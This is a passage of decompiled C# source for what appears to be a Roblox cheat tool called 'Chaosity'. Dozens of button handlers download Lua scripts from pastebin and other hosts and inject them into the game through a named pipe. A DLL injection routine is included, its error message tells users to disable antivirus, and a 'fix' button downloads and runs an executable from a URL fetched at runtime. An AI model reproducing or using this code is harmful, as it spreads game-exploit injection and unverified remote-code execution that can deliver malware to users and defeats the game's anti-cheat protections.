    {
    }

    private void flatButton308_Click(object sender, EventArgs e)
    {
    }

    private void flatButton70_Click(object sender, EventArgs e)
    {
    }

    private void flatButton28_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage64);
    }

    private void flatButton326_Click(object sender, EventArgs e)
    {
    }

    private void flatButton327_Click(object sender, EventArgs e)
    {
    }

    private void flatButton335_Click(object sender, EventArgs e)
    {
    }

    private void flatButton334_Click(object sender, EventArgs e)
    {
    }

    private void flatButton337_Click(object sender, EventArgs e)
    {
    }

    private void flatButton336_Click(object sender, EventArgs e)
    {
    }

    private void flatButton338_Click(object sender, EventArgs e)
    {
    }

    private void flatButton339_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nVcX6R1E"));
    }

    private void flatButton331_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage119);
    }

    private void flatButton332_Click(object sender, EventArgs e)
    {
    }

    private void flatButton333_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage117);
    }

    private void flatButton341_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Z5Zt8dNa"));
    }

    private void flatButton340_Click(object sender, EventArgs e)
    {
    }

    private void flatButton330_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage120);
    }

    private void flatButton342_Click(object sender, EventArgs e)
    {
    }

    private void flatButton343_Click(object sender, EventArgs e)
    {
    }

    private void flatButton344_Click(object sender, EventArgs e)
    {
    }

    private void flatButton345_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox84.Text);
    }

    private void flatButton346_Click(object sender, EventArgs e)
    {
    }

    private void flatButton347_Click(object sender, EventArgs e)
    {
    }

    private void flatButton348_Click(object sender, EventArgs e)
    {
    }

    private void flatButton349_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox86.Text);
    }

    private void flatButton329_Click(object sender, EventArgs e)
    {
    }

    private void flatButton328_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage122);
    }

    private void flatButton71_Click(object sender, EventArgs e)
    {
    }

    private void flatButton29_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage124);
    }

    private void flatButton351_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox87.Text);
    }

    private void flatButton350_Click(object sender, EventArgs e)
    {
    }

    private void flatButton358_Click(object sender, EventArgs e)
    {
    }

    private void flatButton359_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/8XdJC2iX"));
    }

    private void flatButton360_Click(object sender, EventArgs e)
    {
    }

    private void flatButton361_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Ptrnnf3D"));
    }

    private void flatButton362_Click(object sender, EventArgs e)
    {
    }

    private void flatButton363_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6sA8kvmm"));
    }

    private void flatButton364_Click(object sender, EventArgs e)
    {
    }

    private void flatButton365_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3NZkQDCe"));
    }

    private void flatButton366_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox230_Click(object sender, EventArgs e)
    {
    }

    private void flatButton367_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox101.Text);
    }

    private void flatButton368_Click(object sender, EventArgs e)
    {
    }

    private void flatButton369_Click(object sender, EventArgs e)
    {
    }

    private void flatButton357_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage126);
    }

    private void flatButton356_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage127);
    }

    private void flatButton355_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage128);
    }

    private void flatButton354_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage129);
    }

    private void flatButton353_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage130);
    }

    private void flatButton352_Click(object sender, EventArgs e)
    {
    }

    private void flatButton72_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage132);
    }

    private void flatButton52_Click(object sender, EventArgs e)
    {
    }

    private void flatButton370_Click(object sender, EventArgs e)
    {
    }

    private void flatButton371_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox88.Text);
    }

    private void flatButton372_Click(object sender, EventArgs e)
    {
    }

    private void flatButton374_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.RightHand.Touched:connect(function(obj)\nif obj ~= workspace.Terrain then\nobj.CanCollide = false\nwait(1)\nobj.CanCollide = true\nend\nend)");
    }

    private void flatButton373_Click(object sender, EventArgs e)
    {
    }

    private void flatButton376_Click(object sender, EventArgs e)
    {
    }

    private void flatButton375_Click(object sender, EventArgs e)
    {
    }

    private void flatButton382_Click(object sender, EventArgs e)
    {
    }

    private void flatButton383_Click(object sender, EventArgs e)
    {
    }

    private void flatButton384_Click(object sender, EventArgs e)
    {
    }

    private void flatButton385_Click(object sender, EventArgs e)
    {
    }

    private void flatButton386_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox91.Text);
    }

    private void flatButton381_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage136);
    }

    private void flatButton380_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage137);
    }

    private void flatButton379_Click(object sender, EventArgs e)
    {
    }

    private void flatButton387_Click(object sender, EventArgs e)
    {
    }

    private void flatButton388_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/paG30Gr8"));
    }

    private void flatButton389_Click(object sender, EventArgs e)
    {
    }

    private void flatButton390_Click(object sender, EventArgs e)
    {
    }

    private void flatButton378_Click(object sender, EventArgs e)
    {
    }

    private void flatButton377_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage140);
    }

    private void flatButton73_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage141);
    }

    private void flatButton53_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage142);
    }

    private void flatButton391_Click(object sender, EventArgs e)
    {
    }

    private void flatButton392_Click(object sender, EventArgs e)
    {
    }

    private void flatButton393_Click(object sender, EventArgs e)
    {
    }

    private void flatButton394_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox94.Text);
    }

    private void flatButton395_Click(object sender, EventArgs e)
    {
    }

    private void flatButton396_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qc7y8Xrz"));
    }

    private void flatButton397_Click(object sender, EventArgs e)
    {
    }

    private void flatButton398_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nuipWGnf"));
    }

    private void method_59(object sender, EventArgs e)
    {
    }

    private void method_60(object sender, EventArgs e)
    {
    }

    private void flatButton405_Click(object sender, EventArgs e)
    {
    }

    private void flatButton406_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://maxv.ml/uploads/so.lua"));
    }

    private void flatButton407_Click(object sender, EventArgs e)
    {
    }

    private void flatButton408_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/pw3SAuef"));
    }

    private void flatButton409_Click(object sender, EventArgs e)
    {
    }

    private void flatButton410_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://aizen.ml/uploads/ksim.lua"));
    }

    private void flatButton411_Click(object sender, EventArgs e)
    {
    }

    private void flatButton412_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://eprx.000webhostapp.com/scripts/castleheistadventure"));
    }

    private void flatButton413_Click(object sender, EventArgs e)
    {
    }

    private void flatButton414_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/se1NnxCg"));
    }

    private void flatButton415_Click(object sender, EventArgs e)
    {
    }

    private void flatButton416_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://eprx.000webhostapp.com/scripts/makeacake"));
    }

    private void flatButton417_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eMvr9XFR"));
    }

    private void flatButton418_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZtZtZLbk"));
    }

    private void flatButton404_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage143);
    }

    private void flatButton403_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage144);
    }

    private void flatButton402_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage145);
    }

    private void flatButton401_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage146);
    }

    private void flatButton400_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage147);
    }

    private void flatButton399_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage148);
    }

    private void flatButton74_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage93);
    }

    private void flatButton54_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage120);
    }

    private void flatButton420_Click(object sender, EventArgs e)
    {
    }

    private void flatButton421_Click(object sender, EventArgs e)
    {
    }

    private void flatButton419_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UKZxyFHF"));
    }

    private void flatButton427_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox12.Text);
    }

    private void flatButton426_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage94);
    }

    private void flatButton429_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox96.Text);
    }

    private void flatButton428_Click(object sender, EventArgs e)
    {
    }

    private void flatButton431_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox97.Text);
    }

    private void flatButton430_Click(object sender, EventArgs e)
    {
    }

    private void flatButton433_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/4LBrUC2n"));
    }

    private void flatButton432_Click(object sender, EventArgs e)
    {
    }

    private void flatButton435_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox98.Text);
    }

    private void flatButton434_Click(object sender, EventArgs e)
    {
    }

    private void flatButton437_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox99.Text);
    }

    private void flatButton436_Click(object sender, EventArgs e)
    {
    }

    private void flatButton438_Click(object sender, EventArgs e)
    {
    }

    private void flatButton439_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox100.Text);
    }

    private void flatButton440_Click(object sender, EventArgs e)
    {
    }

    private void flatButton441_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox102.Text);
    }

    private void flatButton442_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox103.Text);
    }

    private void flatButton425_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage150);
    }

    private void flatButton424_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage151);
    }

    private void flatButton423_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage152);
    }

    private void flatButton422_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage153);
    }

    private void flatButton305_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage154);
    }

    private void flatButton55_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage156);
    }

    private void flatButton75_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage155);
    }

    private void flatButton443_Click(object sender, EventArgs e)
    {
    }

    private void flatButton444_Click(object sender, EventArgs e)
    {
    }

    private void flatButton76_Click(object sender, EventArgs e)
    {
      Process.Start("https://mega.nz/#!s3QHVCKI!K1Cmu6gVdrCJccoRV8d3NApp-g6c5nHZzarUlS4b_-0");
      int num = (int) MessageBox.Show("Download the script and execute in scripthub. It was too big.");
    }

    private void flatButton56_Click(object sender, EventArgs e)
    {
    }

    private void flatButton448_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage38);
    }

    private void flatButton450_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage158);
    }

    private void flatButton445_Click(object sender, EventArgs e)
    {
    }

    private void flatButton446_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox105.Text);
    }

    private void flatButton447_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage117);
    }

    private void flatButton449_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage93);
    }

    private void flatButton455_Click(object sender, EventArgs e)
    {
    }

    private void flatButton456_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/84W0KTV4"));
    }

    private void flatButton457_Click(object sender, EventArgs e)
    {
    }

    private void flatButton458_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YEMf1ELN"));
    }

    private void flatButton459_Click(object sender, EventArgs e)
    {
    }

    private void flatButton460_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/widic1BZ"));
    }

    private void flatButton461_Click(object sender, EventArgs e)
    {
    }

    private void flatButton462_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/5yehTCTY"));
    }

    private void flatButton454_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage159);
    }

    private void flatButton453_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage160);
    }

    private void flatButton452_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage161);
    }

    private void flatButton451_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage162);
    }

    private void flatButton463_Click(object sender, EventArgs e)
    {
    }

    private void flatButton464_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox106.Text);
    }

    private void flatButton471_Click(object sender, EventArgs e)
    {
    }

    private void flatButton472_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/yq6gKDhB"));
    }

    private void flatButton473_Click(object sender, EventArgs e)
    {
    }

    private void flatButton474_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/bQzK2NFZ"));
    }

    private void flatButton475_Click(object sender, EventArgs e)
    {
    }

    private void flatButton476_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://maxv.ml/uploads/opaw.lua"));
    }

    private void flatButton477_Click(object sender, EventArgs e)
    {
    }

    private void flatButton478_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZmKYpBhB"));
    }

    private void flatButton479_Click(object sender, EventArgs e)
    {
    }

    private void flatButton480_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kWtz4yEV"));
    }

    private void flatButton482_Click(object sender, EventArgs e)
    {
    }

    private void flatButton481_Click(object sender, EventArgs e)
    {
    }

    private void flatButton483_Click(object sender, EventArgs e)
    {
    }

    private void flatButton484_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/x7ChV7XQ"));
    }

    private void flatButton469_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage164);
    }

    private void flatButton468_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage165);
    }

    private void flatButton467_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage166);
    }

    private void flatButton466_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage167);
    }

    private void flatButton465_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage168);
    }

    private void flatButton77_Click(object sender, EventArgs e)
    {
    }

    private void flatButton57_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage170);
    }

    private void flatButton485_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/bQzK2NFZ"));
    }

    private void flatButton486_Click(object sender, EventArgs e)
    {
    }

    private void flatButton487_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/xFB3guNv"));
    }

    private void flatButton470_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage93);
    }

    private void flatButton7_Click_1(object sender, EventArgs e)
    {
    }

    private void button6_Click(object sender, EventArgs e)
    {
      Chaosity chaosity = new Chaosity();
      this.Hide();
      chaosity.Show();
    }

    private void button7_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void cb1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void cb2_CheckedChanged(object sender, EventArgs e)
    {
      if (this.cb2.Checked)
        NamedPipes.easy = true;
      else
        NamedPipes.easy = false;
    }

    private void button18_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.cb2.Checked)
        {
          NamedPipes.EasyExploitsInject();
          NamedPipes.wrd = false;
          NamedPipes.easy = true;
          NamedPipes.nem = false;
        }
        else
        {
          int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Your Antivirus Is Blocking The DLL From Downloading. Please Disable Your Antivirus Then Reload Chaosity.If This Error Continues Please Message Chaosity On Discord @Chaosity#0001");
        Environment.Exit(0);
      }
    }

    private void button2_Click(object sender, EventArgs e)
    {
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void button3_Click(object sender, EventArgs e)
    {
      if (DialogResult.Yes != MessageBox.Show("Are you sure you want to reinstall ROBLOX?", "Chaosity", MessageBoxButtons.YesNo, MessageBoxIcon.Question))
        return;
      int num1 = (int) MessageBox.Show("Roblox is now reinstalling!\nThis could take a while, please wait patiently.", "Chaosity", MessageBoxButtons.OK);
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show(Convert.ToString((object) ex), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
      }
      catch
      {
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
        if (System.IO.File.Exists("Installer.exe"))
          System.IO.File.Delete("Installer.exe");
      }
      catch
      {
      }
      new WebClient().DownloadFile("http://setup.roblox.com/RobloxPlayerLauncher.exe", "Installer.exe");
      Process.Start("Installer.exe");
    }

    private void button1_Click(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
        process.Kill();
    }

    private void button40_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
      this.flatTabControl2.SelectedTab = this.Main;
    }

    private void button4_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void Main_Click(object sender, EventArgs e)
    {
    }

    private void cb2_CheckedChanged_1(object sender, EventArgs e)
    {
      if (this.cb2.Checked)
        NamedPipes.easy = true;
      else
        NamedPipes.easy = false;
    }

    private void cb1_CheckedChanged_1(object sender, EventArgs e)
    {
    }

    private void richTextBox20_TextChanged(object sender, EventArgs e)
    {
    }

    private void richTextBox41_TextChanged(object sender, EventArgs e)
    {
    }

    private void button9_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Filter = "Lua File (*.lua)|*.lua|Text File (*.txt)|*.txt";
      saveFileDialog.Title = "Save Script";
      if (saveFileDialog.ShowDialog() != DialogResult.OK)
        return;
      try
      {
        string str = this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString();
        StreamWriter streamWriter = new StreamWriter((Stream) System.IO.File.Create(saveFileDialog.FileName));
        streamWriter.Write(str);
        streamWriter.Dispose();
      }
      catch
      {
        int num = (int) MessageBox.Show("An unexpected error occured!", "Oof");
      }
    }

    private void button5_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString());
    }

    private void button7_Click_1(object sender, EventArgs e)
    {
      if (this.open.ShowDialog() != DialogResult.OK)
        return;
      this.webBrowser1.Document.InvokeScript("SetText", (object[]) new string[1]
      {
        System.IO.File.ReadAllText(this.open.FileName)
      });
    }

    private void button8_Click(object sender, EventArgs e)
    {
      this.webBrowser1.Document.InvokeScript("SetText", new object[1]
      {
        (object) ""
      });
    }

    private void MultipleROBLOX_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.MultipleROBLOX.Checked)
        return;
      Mutex mutex = new Mutex(true, "ROBLOX_singletonMutex");
      int num = (int) MessageBox.Show("Multiple Roblox activated successfully, join on another account to enable another session.", "Multiple Roblox");
    }

    private void cb3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void button10_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void webBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void OMGGameHubMain_Load(object sender, EventArgs e)
    {
      this.module.SetIdentity("chaos");
      this.api.SetIdentity("chaos");
      if (!this.universalBypassInstalled())
        return;
      int num = (int) MessageBox.Show("You must uninstall Universal Bypass before you can use Chaosity", "Universal Bypass Failed");
      Environment.Exit(0);
    }

    private void OMGGameHubMain_Leave(object sender, EventArgs e)
    {
    }

    private void InitializeComponent()
    {
            this.From1 = new FlatUI.FormSkin();
            this.button4 = new System.Windows.Forms.Button();
            this.button6 = new System.Windows.Forms.Button();
            this.button40 = new System.Windows.Forms.Button();
            this.flatTabControl2 = new FlatUI.FlatTabControl();
            this.Executor = new System.Windows.Forms.TabPage();
            this.button9 = new System.Windows.Forms.Button();
            this.button5 = new System.Windows.Forms.Button();
            this.button8 = new System.Windows.Forms.Button();
            this.button7 = new System.Windows.Forms.Button();
            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
            this.Main = new System.Windows.Forms.TabPage();
            this.button10 = new System.Windows.Forms.Button();
            this.MultipleROBLOX = new System.Windows.Forms.CheckBox();
            this.button3 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.button18 = new System.Windows.Forms.Button();
            this.cb2 = new System.Windows.Forms.CheckBox();
            this.tabPage27 = new System.Windows.Forms.TabPage();
            this.flatButton60 = new FlatUI.FlatButton();
            this.tabPage30 = new System.Windows.Forms.TabPage();
            this.flatButton63 = new FlatUI.FlatButton();
            this.tabPage31 = new System.Windows.Forms.TabPage();
            this.flatButton85 = new FlatUI.FlatButton();
            this.tabPage32 = new System.Windows.Forms.TabPage();
            this.flatButton276 = new FlatUI.FlatButton();
            this.flatButton88 = new FlatUI.FlatButton();
            this.tabPage33 = new System.Windows.Forms.TabPage();
            this.flatButton304 = new FlatUI.FlatButton();
            this.flatButton91 = new FlatUI.FlatButton();
            this.pictureBox46 = new System.Windows.Forms.PictureBox();
            this.tabPage36 = new System.Windows.Forms.TabPage();
            this.flatButton106 = new FlatUI.FlatButton();
            this.pictureBox58 = new System.Windows.Forms.PictureBox();
            this.flatButton107 = new FlatUI.FlatButton();
            this.tabPage38 = new System.Windows.Forms.TabPage();
            this.flatButton110 = new FlatUI.FlatButton();
            this.pictureBox60 = new System.Windows.Forms.PictureBox();
            this.flatButton111 = new FlatUI.FlatButton();
            this.tabPage45 = new System.Windows.Forms.TabPage();
            this.flatButton128 = new FlatUI.FlatButton();
            this.pictureBox70 = new System.Windows.Forms.PictureBox();
            this.flatButton129 = new FlatUI.FlatButton();
            this.tabPage48 = new System.Windows.Forms.TabPage();
            this.flatButton18 = new FlatUI.FlatButton();
            this.pictureBox78 = new System.Windows.Forms.PictureBox();
            this.flatButton21 = new FlatUI.FlatButton();
            this.tabPage51 = new System.Windows.Forms.TabPage();
            this.flatButton12 = new FlatUI.FlatButton();
            this.pictureBox17 = new System.Windows.Forms.PictureBox();
            this.flatButton64 = new FlatUI.FlatButton();
            this.tabPage52 = new System.Windows.Forms.TabPage();
            this.flatButton150 = new FlatUI.FlatButton();
            this.pictureBox88 = new System.Windows.Forms.PictureBox();
            this.flatButton151 = new FlatUI.FlatButton();
            this.tabPage58 = new System.Windows.Forms.TabPage();
            this.flatButton162 = new FlatUI.FlatButton();
            this.pictureBox94 = new System.Windows.Forms.PictureBox();
            this.flatButton163 = new FlatUI.FlatButton();
            this.tabPage61 = new System.Windows.Forms.TabPage();
            this.flatButton32 = new FlatUI.FlatButton();
            this.pictureBox19 = new System.Windows.Forms.PictureBox();
            this.flatButton66 = new FlatUI.FlatButton();
            this.tabPage64 = new System.Windows.Forms.TabPage();
            this.label3 = new System.Windows.Forms.Label();
            this.flatButton277 = new FlatUI.FlatButton();
            this.flatButton178 = new FlatUI.FlatButton();
            this.pictureBox106 = new System.Windows.Forms.PictureBox();
            this.flatButton179 = new FlatUI.FlatButton();
            this.tabPage65 = new System.Windows.Forms.TabPage();
            this.flatButton180 = new FlatUI.FlatButton();
            this.pictureBox107 = new System.Windows.Forms.PictureBox();
            this.flatButton181 = new FlatUI.FlatButton();
            this.tabPage66 = new System.Windows.Forms.TabPage();
            this.flatButton182 = new FlatUI.FlatButton();
            this.pictureBox108 = new System.Windows.Forms.PictureBox();
            this.flatButton183 = new FlatUI.FlatButton();
            this.tabPage67 = new System.Windows.Forms.TabPage();
            this.flatButton184 = new FlatUI.FlatButton();
            this.pictureBox109 = new System.Windows.Forms.PictureBox();
            this.flatButton185 = new FlatUI.FlatButton();
            this.tabPage70 = new System.Windows.Forms.TabPage();
            this.flatButton197 = new FlatUI.FlatButton();
            this.pictureBox119 = new System.Windows.Forms.PictureBox();
            this.flatButton198 = new FlatUI.FlatButton();
            this.tabPage72 = new System.Windows.Forms.TabPage();
            this.flatButton201 = new FlatUI.FlatButton();
            this.pictureBox121 = new System.Windows.Forms.PictureBox();
            this.flatButton202 = new FlatUI.FlatButton();
            this.tabPage74 = new System.Windows.Forms.TabPage();
            this.flatButton205 = new FlatUI.FlatButton();
            this.pictureBox123 = new System.Windows.Forms.PictureBox();
            this.richTextBox59 = new System.Windows.Forms.RichTextBox();
            this.flatButton206 = new FlatUI.FlatButton();
            this.tabPage76 = new System.Windows.Forms.TabPage();
            this.flatButton218 = new FlatUI.FlatButton();
            this.pictureBox134 = new System.Windows.Forms.PictureBox();
            this.flatButton219 = new FlatUI.FlatButton();
            this.tabPage77 = new System.Windows.Forms.TabPage();
            this.flatButton220 = new FlatUI.FlatButton();
            this.pictureBox135 = new System.Windows.Forms.PictureBox();
            this.flatButton221 = new FlatUI.FlatButton();
            this.tabPage79 = new System.Windows.Forms.TabPage();
            this.flatButton224 = new FlatUI.FlatButton();
            this.pictureBox137 = new System.Windows.Forms.PictureBox();
